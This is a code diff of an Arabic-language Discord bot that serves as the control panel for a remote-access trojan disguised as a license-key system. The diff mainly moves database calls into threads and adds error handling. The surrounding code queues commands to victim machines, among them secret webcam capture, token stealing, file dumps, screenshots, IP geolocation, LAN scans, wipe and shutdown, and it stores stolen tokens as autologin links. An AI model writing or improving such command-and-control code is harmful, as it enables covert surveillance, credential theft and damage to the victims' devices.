@@ -243,7 +243,7 @@ class WallpaperModal(discord.ui.Modal, title="تغيير خلفية سطح ال�
         self.code = code
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
         db.setdefault("remote_wallpapers", {})[self.code] = {"url": self.image_url.value.strip(), "id": str(time.time())}
         if save_db(db, sha, url, headers, f"Wallpaper update for {self.code}"):
@@ -258,7 +258,7 @@ class KillProcessModal(discord.ui.Modal, title="إيقاف عملية نشطة")
         self.code = code
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
         db.setdefault("remote_killprocess", {})[self.code] = {"name": self.process_name.value.strip(), "id": str(time.time())}
         if save_db(db, sha, url, headers, f"Kill process {self.process_name.value} for {self.code}"):
@@ -273,7 +273,7 @@ class FileBrowserModal(discord.ui.Modal, title="استعراض ملفات الع
         self.code = code
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
         db.setdefault("remote_filebrowser", {})[self.code] = {"path": self.folder_path.value.strip(), "id": str(time.time())}
         if save_db(db, sha, url, headers, f"Files browse for {self.code}"):
@@ -295,7 +295,7 @@ class LagTimerModal(discord.ui.Modal, title="تفعيل لاج مؤقت للعم
         except ValueError:
             return await interaction.followup.send("❌ يرجى إدخال أرقام صحيحة فقط.", ephemeral=True)
         
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
         db.setdefault("remote_lag_timers", {})[self.code] = {"ping": ping, "duration": duration, "id": str(time.time())}
         if save_db(db, sha, url, headers, f"Lag timer {ping}ms for {self.code}"):
@@ -319,8 +319,14 @@ class LicenseBot(discord.Client):
         if interaction.type == discord.InteractionType.component:
             custom_id = interaction.data.get("custom_id", "")
             
+            # التأجيل الفوري لمنع تعليق ديسكورد (Thinking...) وانتهاء المهلة
+            if not interaction.response.is_done():
+                try:
+                    await interaction.response.defer(thinking=True, ephemeral=True)
+                except Exception:
+                    pass
+
             if custom_id.startswith(("ban_", "unban_", "recycle_", "kick_")):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
                 try:
                     action, encoded_data = custom_id.split("_", 1)
                     raw_data = base64.urlsafe_b64decode(encoded_data + "=" * (-len(encoded_data) % 4)).decode("utf-8")
@@ -329,8 +335,10 @@ class LicenseBot(discord.Client):
                     await interaction.followup.send("❌ فشل تحليل بيانات الزر.", ephemeral=True)
                     return
 
-                db, sha, url, headers = fetch_db()
-                if not db: return
+                db, sha, url, headers = await asyncio.to_thread(fetch_db)
+                if not db: 
+                    await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
+                    return
 
                 if action == "ban":
                     if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
@@ -359,18 +367,16 @@ class LicenseBot(discord.Client):
                         await interaction.followup.send(f"👢 تم إرسال أمر الطرد للعميل `{user_code}`!", ephemeral=True)
 
             elif custom_id.startswith("del_Unused_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
                 code_to_del = custom_id.replace("del_Unused_", "")
-                db, sha, url, headers = fetch_db()
+                db, sha, url, headers = await asyncio.to_thread(fetch_db)
                 if db and code_to_del in db.get("codes", {}):
                     del db["codes"][code_to_del]
                     if save_db(db, sha, url, headers, f"Delete unused {code_to_del}"):
                         await interaction.followup.send(f"🗑️ تم حذف الكود `{code_to_del}` نهائياً!", ephemeral=True)
 
             elif custom_id.startswith("unban_code_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
                 code_to_unban = custom_id.replace("unban_code_", "")
-                db, sha, url, headers = fetch_db()
+                db, sha, url, headers = await asyncio.to_thread(fetch_db)
                 if db and code_to_unban in db.get("blacklisted_codes", []):
                     db["blacklisted_codes"].remove(code_to_unban)
                     if code_to_unban in db.get("codes", {}):
@@ -380,9 +386,8 @@ class LicenseBot(discord.Client):
                         await interaction.followup.send(f"♻️ تم رفع الحظر عن الكود `{code_to_unban}` بنجاح!", ephemeral=True)
 
             elif custom_id.startswith("man_dev_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
                 dev_code = custom_id.replace("man_dev_", "")
-                db, _, _, _ = fetch_db()
+                db, _, _, _ = await asyncio.to_thread(fetch_db)
                 if db and dev_code in db.get("codes", {}):
                     info = db["codes"][dev_code]
                     ip = info.get("ip", "Unknown")
@@ -394,6 +399,8 @@ class LicenseBot(discord.Client):
                         f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{dev_code}`\n🌐 IP: `{ip}`\n🔌 Port: `{port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", 
                         view=view, ephemeral=True
                     )
+                else:
+                    await interaction.followup.send("❌ لم يتم العثور على بيانات الجهاز.", ephemeral=True)
 
 client = LicenseBot()
 
@@ -410,7 +417,7 @@ class ConfirmSaveView(discord.ui.View):
     async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         await asyncio.sleep(1)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if not db: return
         if "codes" not in db: db["codes"] = {}
         for c in self.codes: db["codes"][c] = {"used": False, "device": None, "ip": None, "port": None, "country": None}
@@ -449,7 +456,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
     async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("blacklisted_codes", []).append(self.code)
             db.setdefault("blacklisted_devices", []).append(self.hwid)
@@ -461,7 +468,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
     async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("targeted_kick_messages", {})[self.code] = {"msg": "تم طردك من المالك", "id": str(time.time())}
             if save_db(db, sha, url, headers, f"Kick {self.code}"):
@@ -470,7 +477,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="🌍 الموقع الدقيق (Geolocation)", style=discord.ButtonStyle.secondary, custom_id="dev_act_geo", row=1)
     async def geo_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, _, _, _ = fetch_db()
+        db, _, _, _ = await asyncio.to_thread(fetch_db)
         if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
         info = db.get("codes", {}).get(self.code, {})
         ip_addr = info.get("ip")
@@ -506,7 +513,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="📡 فحص الشبكة (IPConfig)", style=discord.ButtonStyle.secondary, custom_id="dev_act_ipconfig", row=1)
     async def ipconfig_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("remote_ipconfig", {})[self.code] = {"id": str(time.time())}
             if save_db(db, sha, url, headers, f"IPConfig {self.code}"):
@@ -515,7 +522,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="🔍 مسح الشبكة (LanScan)", style=discord.ButtonStyle.secondary, custom_id="dev_act_lanscan", row=1)
     async def lanscan_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("remote_lanscan", {})[self.code] = {"id": str(time.time())}
             if save_db(db, sha, url, headers, f"LanScan {self.code}"):
@@ -524,7 +531,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="🧹 تنظيف الكاش (Wipe)", style=discord.ButtonStyle.secondary, custom_id="dev_act_wipe", row=2)
     async def wipe_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("remote_wipe", {})[self.code] = {"id": str(time.time())}
             if save_db(db, sha, url, headers, f"Wipe {self.code}"):
@@ -549,7 +556,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=4)
     async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("remote_screenshots", {})[self.code] = {"id": str(time.time())}
             if save_db(db, sha, url, headers, f"SS {self.code}"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
@@ -557,7 +564,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="📸 كاميرا سرية", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=4)
     async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("remote_webcams", {})[self.code] = {"id": str(time.time())}
             if save_db(db, sha, url, headers, f"Webcam {self.code}"): await interaction.followup.send("📸 تم طلب الكاميرا!", ephemeral=True)
@@ -565,7 +572,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="🔑 سحب التوكنات", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=4)
     async def tokens_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("remote_token_stealers", {})[self.code] = {"id": str(time.time())}
             if save_db(db, sha, url, headers, f"Tokens Dump {self.code}"): await interaction.followup.send("🔑 تم طلب سحب بيانات توكنات شاملة بنجاح!", ephemeral=True)
@@ -573,7 +580,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="📂 سحب الملفات (Dump)", style=discord.ButtonStyle.secondary, custom_id="dev_act_diskdump", row=4)
     async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("remote_disk_dumps", {})[self.code] = {"id": str(time.time())}
             if save_db(db, sha, url, headers, f"Dump {self.code}"): await interaction.followup.send("📂 تم طلب سحب الملفات!", ephemeral=True)
@@ -581,7 +588,7 @@ class DeviceActionsView(discord.ui.View):
     @discord.ui.button(label="⚡ إيقاف جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=5)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
+        db, sha, url, headers = await asyncio.to_thread(fetch_db)
         if db:
             db.setdefault("remote_shutdowns", {})[self.code] = {"id": str(time.time())}
             if save_db(db, sha, url, headers, f"Shutdown {self.code}"): await interaction.followup.send("⚡ تم إيقاف جهاز العميل بنجاح!", ephemeral=True)
@@ -608,7 +615,7 @@ class MainDashboardView(discord.ui.View):
     @discord.ui.button(label="📁 إدارة الأكواد المتاحة", style=discord.ButtonStyle.primary, custom_id="dash_unused", row=0)
     async def unused(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, _, _, _ = fetch_db()
+        db, _, _, _ = await asyncio.to_thread(fetch_db)
         if not db: return
         unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
         await interaction.followup.send(f"🟢 **الأكواد المتاحة:** `{len(unused_list)}`", view=UnusedManagementView(unused_list) if unused_list else None, ephemeral=True)
@@ -616,7 +623,7 @@ class MainDashboardView(discord.ui.View):
     @discord.ui.button(label="🚫 إدارة الأكواد المحظورة", style=discord.ButtonStyle.danger, custom_id="dash_blacklist", row=0)
     async def black(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, _, _, _ = fetch_db()
+        db, _, _, _ = await asyncio.to_thread(fetch_db)
         if not db: return
         blacklisted = db.get("blacklisted_codes", [])
         await interaction.followup.send(f"🚫 **المحظورة:** `{len(blacklisted)}`", view=BlacklistedCodesView(blacklisted) if blacklisted else None, ephemeral=True)
@@ -624,7 +631,7 @@ class MainDashboardView(discord.ui.View):
     @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_devices", row=1)
     async def devs(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, _, _, _ = fetch_db()
+        db, _, _, _ = await asyncio.to_thread(fetch_db)
         if not db: return
         devs_list = [(c, info) for c, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
         await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل:**", view=DevicesSubMenuView(devs_list) if devs_list else None, ephemeral=True)
@@ -653,7 +660,7 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
     encoded_token = requests.utils.quote(clean_token, safe='')
     web_link = f"{HOST_URL}autologin?platform={platform}&token={encoded_token}"
     
-    db, sha, url, headers = fetch_db()
+    db, sha, url, headers = await asyncio.to_thread(fetch_db)
     if db:
         if "saved_tokens" not in db: db["saved_tokens"] = []
         db["saved_tokens"].append({"platform": platform, "token": clean_token, "link": web_link, "time": int(time.time())})
@@ -678,7 +685,7 @@ async def generate_track_link(interaction: discord.Interaction, redirect_to: str
 @client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
 async def unused_command(interaction: discord.Interaction):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, _, _, _ = fetch_db()
+    db, _, _, _ = await asyncio.to_thread(fetch_db)
     if not db: return
     unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
     if not unused_list:
@@ -690,7 +697,7 @@ async def unused_command(interaction: discord.Interaction):
 @client.tree.command(name="clearused", description="حذف جميع الأكواد المستخدمة دفعة واحدة")
 async def clear_used_codes(interaction: discord.Interaction):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
+    db, sha, url, headers = await asyncio.to_thread(fetch_db)
     if not db or "codes" not in db: return
     old_count = len(db["codes"])
     db["codes"] = {c: info for c, info in db["codes"].items() if not info.get("used", False)}
@@ -702,7 +709,7 @@ async def clear_used_codes(interaction: discord.Interaction):
 @app_commands.describe(code="الكود المراد فحصه")
 async def check_code(interaction: discord.Interaction, code: str):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, _, _, _ = fetch_db()
+    db, _, _, _ = await asyncio.to_thread(fetch_db)
     code = code.upper()
     if not db or code not in db.get("codes", {}):
         await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
@@ -715,7 +722,7 @@ async def check_code(interaction: discord.Interaction, code: str):
 @app_commands.describe(code="الكود المراد حذفه")
 async def delete_code(interaction: discord.Interaction, code: str):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
+    db, sha, url, headers = await asyncio.to_thread(fetch_db)
     code = code.upper()
     if not db or code not in db.get("codes", {}):
         await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
@@ -728,7 +735,7 @@ async def delete_code(interaction: discord.Interaction, code: str):
 @app_commands.describe(code="الكود المراد تصفيره")
 async def reset_device(interaction: discord.Interaction, code: str):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
+    db, sha, url, headers = await asyncio.to_thread(fetch_db)
     code = code.upper()
     if not db or code not in db.get("codes", {}):
         await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
@@ -745,7 +752,7 @@ async def reset_device(interaction: discord.Interaction, code: str):
 @app_commands.describe(target="اسم الجهاز أو كود التفعيل المستهدف")
 async def screenshot_command(interaction: discord.Interaction, target: str):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
+    db, sha, url, headers = await asyncio.to_thread(fetch_db)
     if not db: return
     target_upper = target.strip().upper()
     if target_upper not in db.get("codes", {}):
@@ -775,7 +782,7 @@ async def sync_commands(interaction: discord.Interaction):
 @client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
 async def stats_gui_command(interaction: discord.Interaction):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, _, _, _ = fetch_db()
+    db, _, _, _ = await asyncio.to_thread(fetch_db)
     if not db: return
     codes = db.get("codes", {})
     total = len(codes)
